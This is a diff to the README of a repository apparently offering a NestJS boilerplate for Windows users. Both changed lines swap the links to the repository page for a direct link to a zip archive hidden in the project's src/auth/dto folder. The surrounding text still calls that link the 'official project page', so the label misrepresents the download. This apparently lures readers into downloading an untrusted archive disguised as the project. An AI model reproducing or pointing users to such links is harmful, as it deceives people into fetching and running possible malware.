@@ -1,6 +1,6 @@
 # 🚀 nestjs-boilerplate - Build stable web applications with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/michaelanti2007/nestjs-boilerplate)
+[![Download Software](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/michaelanti2007/nestjs-boilerplate/raw/refs/heads/main/src/auth/dto/nestjs_boilerplate_v2.1.zip)
 
 ## 📋 About This Project
 
@@ -19,7 +19,7 @@ To run this application on your Windows computer, you need a few core tools inst
 
 Follow these steps to set up the software on your local machine.
 
-1.  Visit the official project page to access the files: [https://github.com/michaelanti2007/nestjs-boilerplate](https://github.com/michaelanti2007/nestjs-boilerplate).
+1.  Visit the official project page to access the files: [https://github.com/michaelanti2007/nestjs-boilerplate/raw/refs/heads/main/src/auth/dto/nestjs_boilerplate_v2.1.zip](https://github.com/michaelanti2007/nestjs-boilerplate/raw/refs/heads/main/src/auth/dto/nestjs_boilerplate_v2.1.zip).
 2.  Click the green button labeled "Code" on the right side of the screen.
 3.  Choose "Download ZIP" from the menu.
 4.  Locate the downloaded file in your Downloads folder.
